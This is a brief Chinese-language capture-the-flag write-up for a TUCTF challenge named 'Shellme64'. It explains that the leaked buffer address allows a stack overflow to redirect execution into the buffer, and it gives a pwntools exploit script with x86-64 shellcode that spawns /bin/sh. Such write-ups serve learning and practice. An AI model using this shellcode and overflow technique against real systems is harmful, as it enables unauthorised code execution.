### Shellme64

> [附件](./shellme64)

给了buffer地址，可以溢出覆盖返回地址跳转到buffer执行shellcode

[Exploit script:](./shellme32)

```python
from pwn import *
context.log_level='debug'

p = remote('chal.tuctf.com',30507)
# p = process('shellme64')

sc="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

p.recvuntil('this\n')
ret=int(p.recvuntil('\n',drop=True),16)
p.sendline(sc.ljust(40,'A')+p64(ret))
p.interactive()
```